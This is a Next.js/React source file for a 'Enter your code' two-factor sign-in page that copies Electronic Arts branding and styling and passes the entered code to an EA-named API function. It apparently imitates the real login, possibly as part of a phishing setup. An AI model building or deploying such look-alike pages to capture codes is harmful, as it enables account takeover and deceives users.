"use client";
import React from 'react'
import Image from 'next/image';
import "@/styles/login.css";
import { zodResolver } from "@hookform/resolvers/zod"
import * as z from "zod"
import { useForm } from 'react-hook-form';
import { FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Form } from '@/components/ui/form';
import { Button } from '@/components/ui/button';
import { cn } from '@/lib/utils';
import { useRouter, useSearchParams } from 'next/navigation';
import { code2fa } from '@/api/ea';

const formSchema = z.object({
  code: z.string({
    required_error: "The security code you entered is invalid"
  })
})

const LoginPage = () => {

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    // mode: "onBlur",
  })
  async function onSubmit(values: z.infer<typeof formSchema>) {
    const res = await code2fa(values.code)

    if (!res.ok) {
      form.setError("code", {
        type: "manual",
        message: "The security code you entered is invalid"
      })
      return
    }
    router.push(`/`)
  }
  const router = useRouter()
  const params = useSearchParams()

  const email = params.get("email")?.toLocaleLowerCase()

  if (!email) router.push("/login")

  const em = email?.split("@")[0]?.slice(0, 2) + "*****" + "@" + email?.split("@")[1]


  const resendVerificationCode = () => {
    console.log("resendVerificationCode")
  }

  return (
    <div
      className='bg-[#1d2033] w-screen h-screen p-5'
    >
      <div className='relative myBox mx-auto max-w-sm flex flex-col gap-4'>
        <div className='absolute'>
          <Button onClick={() => router.back()} size="sm" className='flex flex-row justify-center items-center pr-4 rounded-lg pl-2 bg-[#343647] hover:bg-[#343647] hover:scale-95 transition-all duration-200'>
            <svg className='w-4 h-4 font-bold' xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" data-src="/static/media/ARROW_LEFT.e40e5952.svg" ><g id="Icons/SM/Navigation/Arrow-Left" fill="none" fill-rule="evenodd"><path id="Bounding-Box" d="M0 0h16v16H0z"></path><path id="Primary" fill="#FFF" d="M5.293 4.707a1 1 0 0 1 1.414-1.414l4 4a1 1 0 0 1 0 1.415l-4 4a1 1 0 1 1-1.414-1.415L8.586 8 5.293 4.707z" transform="matrix(-1 0 0 1 16 0)"></path></g></svg>
            <span className='fontElectronics text-xs'>BACK</span>
          </Button>
        </div>
        <div className=" pt-10 flex flex-col gap-y-6 items-center">
          <Image
            alt="" src="/EALogo-New.svg" width={65} height={65} />
          <p className="font-medium text-2xl text-white fontElectronics tracking-wide text-center">
            Enter your code
          </p>
        </div>
        <p className='text-white w-full text-center'>
          We sent your verification code to<br />  {em}. Enter your code below.
        </p>



        <div className="">
          <Form {...form}>
            <form
              onSubmit={form.handleSubmit(onSubmit)}
              className="flex flex-col gap-4">

              <FormField
                control={form.control}
                name="code"
                render={({ field, fieldState }) => (
                  <FormItem className='flex flex-col gap-0.5 '>
                    <FormLabel >CODE</FormLabel>
                    <FormControl>
                      <Input className={cn({
                        "border-red-600 hover:border-red-600": fieldState.error,
                      })} placeholder="Enter 6 digit code" {...field} />
                    </FormControl>
                    <FormMessage className='' />
                  </FormItem>
                )}
              />


              <span className='flex flex-row gap-4 otkcheckbox checkbox-login-first'>
                <input type="checkbox" id="rememberMe" name="rememberMe" className='w-6 h-6 bg-[#141724] rounded-sm accent-blue-500 ring-0 focus:ring-0' />
                <span className='text-white text-lg'>
                  Remember this device
                </span>
              </span>

              <Button className="otkbtn otkbtn-primary fontElectronics mt-4 font-semibold">
                SIGN IN
              </Button>
            </form>
          </Form>
        </div>

        <div className='flex flex-col justify-center items-center'>
          <Button onClick={() => resendVerificationCode()} variant="link" className='text-[#5288fd] text-base hover:underline font-extralight'>
            Resend verification code
          </Button>
        </div>


      </div>
    </div>
  )
}

export default LoginPage